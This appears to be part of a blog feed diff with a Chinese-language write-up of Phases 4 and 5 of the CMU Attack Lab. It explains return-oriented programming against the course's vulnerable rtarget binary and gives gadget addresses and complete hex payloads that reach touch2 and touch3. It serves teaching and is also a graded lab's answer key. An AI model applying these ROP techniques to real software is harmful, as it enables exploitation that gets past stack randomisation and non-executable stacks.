+<h1 id="Part-2-Return-Oriented-Programming"><a href="#Part-2-Return-Oriented-Programming" class="headerlink" title="Part 2: Return-Oriented Programming"></a>Part 2: Return-Oriented Programming</h1><p>在第二部分中，我们要攻击的是<code>rtarget</code>，它的代码内容与第一部分基本相同，但是攻击它却比第一部分要难得多，主要是因为它采用了两种策略来对抗缓冲区溢出攻击</p>
+<ul>
+<li>栈随机化。这段程序分配的栈的位置在每次运行时都是随机的，这就使我们无法确定在哪里插入代码</li>
+<li>限制可执行代码区域。它限制栈上存放的代码是不可执行的。</li>
+</ul>
+<p>看到这里，我不禁一头雾水，这下子该怎么攻击啊？</p>
+<p>庆幸的是，文档也提供了攻击策略，即<strong>ROP：面向返回的程序设计</strong>，就是在已经存在的程序中找到特定的以<code>ret</code>结尾的指令序列为我们所用，称这样的代码段为<code>gadget</code>，把要用到部分的地址压入栈中，每次<code>ret</code>后又会取出一个新的<code>gadget</code>，于是这样就能形成一个程序链，实现我们的目的。<strong>我喜欢将这种攻击方式称作“就地取材，拼凑代码”</strong>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305141735521.png" alt="image-20220305141735521"></p>
+<p>同时，我们有如下指令编码表：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305135105263.png" alt="image-20220305135105263"></p>
+<p><strong>举个例子：</strong></p>
+<p><code>rtarget</code>有这样一个函数：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setval_210</span><span class="params">(<span class="type">unsigned</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    *p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>它的汇编代码字节级表示为：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">	400f15: c7 07 d4 48 89 c7 	movl $0xc78948d4,(%rdi)</span><br><span class="line">	400f1b: c3 					retq</span><br></pre></td></tr></table></figure>
+
+<p>查表可知，取其中一部分字节序列 48 89 c7 就表示指令<code>movq %rax, %rdi</code>，这整句指令的地址为<code>0x400f15</code>，于是从<code>0x400f18</code>开始的代码就可以变成下面这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq %rax, %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>这个小片段就可以作为一个<code>gadget</code>为我们所用。</p>
+<p>其它一些我们可以利用的代码都在文件<code>farm.c</code>中展示了出来</p>
+<h2 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase 4"></a>Phase 4</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>本题的任务与<code>Phase 2</code>相同，都是要求返回到<code>touch2</code>函数，<code>phase 2</code>中用到的注入代码为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq    $0x59b997fa, %rdi</span><br><span class="line">pushq   $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>我们根本不可能找到这种带特定立即数的<code>gadget</code>，只能思考其他办法。</p>
+<p>首先，要做的是把 cookie 赋值给参数寄存器<code>%rdi</code>，考虑将 cookie 放在栈中，再用指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>就能实现参数的赋值了，当<code>ret</code>后，从栈中取出来的程序地址再设置为<code>touch2</code>的地址就能成功解决本题</p>
+<p>但是后来发现在<code>farm</code>中找不到这条指令的<code>gadget</code>，经过多次尝试，只好用其他寄存器进行中转，考虑用两个<code>gadget</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">popq %rax</span><br><span class="line">ret</span><br><span class="line">###############</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<h3 id="栈帧讲解-2"><a href="#栈帧讲解-2" class="headerlink" title="栈帧讲解"></a>栈帧讲解</h3><p>根据我们的思路，栈帧情况如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305153502546.png" alt="image-20220305153502546"></p>
+<p>逻辑如下：</p>
+<ul>
+<li><code>getbuf</code>执行<code>ret</code>，从栈中弹出返回地址，跳转到我们的<code>gardget01</code></li>
+<li><code>gadget01</code>执行，将<code>cookie</code>弹出，赋值给<code>%rax</code>，然后执行<code>ret</code>，继续弹出返回地址，跳转到<code>gardget2</code></li>
+<li><code>gardget2</code>执行，将<code>cookie</code>值成功赋值给参数寄存器<code>%rdi</code>，然后执行<code>ret</code>，继续弹出返回地址，跳转到<code>touch2</code></li>
+</ul>
+<h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h3><p>首要问题是找到我们需要的<code>gadget</code></p>
+<p>先用如下指令得到<code>target</code>的汇编代码及字节级表示</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objdump -d rtarget &gt; rtarget.s</span><br></pre></td></tr></table></figure>
+
+<p>查表知，<code>pop %rax</code>用<code>58</code>表示，于是查找<code>58</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:       c3                      retq                   retq</span><br></pre></td></tr></table></figure>
+
+<p>得到指令地址为<code>0x4019ab</code></p>
+<p><code>movq %rax, %rdi</code>表示为<code>48 89 c7</code>，刚好能找到！其中 90 表示“空”，可以忽略</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:       c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p>得到指令地址为<code>0x4019c5</code></p>
+<p>根据上图的栈帧，就能写出我们的输入序列：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305161143538.png" alt="image-20220305161143538"></p>
+<p><strong>攻击成功！</strong></p>
+<h2 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase 5"></a>Phase 5</h2><p>先附上<code>Write up</code>中来自 CMU 官方的劝退：</p>
+<blockquote>
+<p>Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95&#x2F;100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now. Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a  true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.</p>
+</blockquote>
+<p>现在是晚上 23:20，我本来已经头昏眼花准备就寝明日再战。但看到这段话，好家伙，不仅没把我劝退，还让我的困意一下子消失，精神振奋了起来。</p>
+<p><strong>长缨已在手，缚住苍龙就在今日！</strong></p>
+<h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>本题的任务与<code>Phase 3</code>相同，都是要求返回到<code>touch3</code>函数</p>
+<p><code>Phase 3</code>中用到的注入代码为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq    $0x5561dca8, %rdi</span><br><span class="line">pushq   $0x4018fa</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>0x5561dca8</code>是栈中<code>cookie</code>存放的地址。</p>
+<p>而在本题中，栈的位置是随机的，把<code>cookie</code>存放在栈中似乎不太现实，但是我们又不得不这样做，那么有什么办法呢？只能在代码中获取<code>%rsp</code>的地址，然后根据偏移量来确定<code>cookie</code>的地址。想到这，思路就明晰了。</p>
+<p>查表，<code>movq %rsp, xxx</code>表示为<code>48 89 xx</code>，查找一下有没有可用的<code>gadget</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:       c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:       c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p>还真找到了，<code>48 89 e0</code>对应的汇编代码为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq %rsp, %rax</span><br></pre></td></tr></table></figure>
+
+<p>地址为：<code>0x401aad</code></p>
+<p>根据提示，有一个<code>gadget</code>一定要用上</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:       c3                      retq</span><br></pre></td></tr></table></figure>
+
+<p>地址为：<code>0x4019d6</code></p>
+<p>通过合适的赋值，这段代码就能实现<code>%rsp</code>加上段内偏移地址来确定<code>cookie</code>的位置</p>
+<p>剩下部分流程与<code>Phase 3</code>一致，大体思路如下：</p>
+<ul>
+<li>先取得栈顶指针的位置</li>
+<li>取出存在栈中得偏移量的值</li>
+<li>通过<code>lea    (%rdi,%rsi,1),%rax</code>得到 cookie 的地址</li>
+<li>将 cookie 的地址传给<code>%rdi</code></li>
+<li>调用<code>touch 3</code></li>
+</ul>
+<p>由于<code>gadget</code>的限制，中间的细节需要很多尝试，尝试过程不再一一列举了，我们直接给出代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#地址：0x401aad</span><br><span class="line">movq %rsp, %rax</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#地址：0x4019a2</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#地址：0x4019cc</span><br><span class="line">popq %rax</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#地址：0x4019dd</span><br><span class="line">movl %eax, %edx</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#地址：0x401a70</span><br><span class="line">movl %edx, %ecx</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#地址：0x401a13</span><br><span class="line">movl %ecx, %esi</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#地址：0x4019d6</span><br><span class="line">lea    (%rdi,%rsi,1),%rax</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#地址：0x4019a2</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<h3 id="栈帧讲解-3"><a href="#栈帧讲解-3" class="headerlink" title="栈帧讲解"></a>栈帧讲解</h3><p>为节省空间，每一行代码都省略了后面的<code>ret</code>，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305192432219.png" alt="image-20220305192432219"></p>
+<p>逻辑在图上标的很清楚，这里就不再用文字写啦！</p>
+<p><strong>要注意</strong>，<code>getbuf</code>执行<code>ret</code>后相当于进行了一次<code>pop</code>操作，<code>test</code>的栈顶指针<code>%rsp=%rsp+0x8</code>，所以<code>cookie</code>相对于此时栈顶指针的偏移量是<code>0x48</code>而不是<code>0x50</code></p>
+<h3 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h3><p>根据上图的栈帧，写出输入序列：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">ad 1a 40 00 00 00 00 00 </span><br><span class="line">a2 19 40 00 00 00 00 00 </span><br><span class="line">cc 19 40 00 00 00 00 00 </span><br><span class="line">48 00 00 00 00 00 00 00 </span><br><span class="line">dd 19 40 00 00 00 00 00 </span><br><span class="line">70 1a 40 00 00 00 00 00 </span><br><span class="line">13 1a 40 00 00 00 00 00 </span><br><span class="line">d6 19 40 00 00 00 00 00 </span><br><span class="line">a2 19 40 00 00 00 00 00 </span><br><span class="line">fa 18 40 00 00 00 00 00 </span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220305193301330.png" alt="image-20220305193301330"></p>
+<p><strong>Pass! 攻击成功！</strong></p>
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
-<li>DataLab 让我了解到我有多么菜。看似简单的数据操作，想要在有限的条件下写得天衣无缝需要敏锐的观察力以及强大的逻辑思维能力。</li>
-<li>本实验耗时5天，约7小时。</li>
+<li>本实验涉及的内容在课本中只有短短几页的篇幅，而实际操作中却要考虑如此多的东西，确实是那句话“纸上得来终觉浅，绝知此事要躬行”。五个<code>Phase</code>的难度是层层递进的，<code>Part 1</code>让我对部分汇编指令以及栈的原理有了更深的领悟；<code>Part 2</code>可能就更加贴合实际工程项目了，我在这里初步学习了“ROP”这一天才的攻击技术，实现成功的攻击需要对每一个字节都能有足够的敏感。同时，在我以后编写的代码中，也应该注意到缓冲区溢出的问题</li>
+<li>本实验耗时2天，约9小时</li>
 </ul>
 ]]></content>
       <categories>
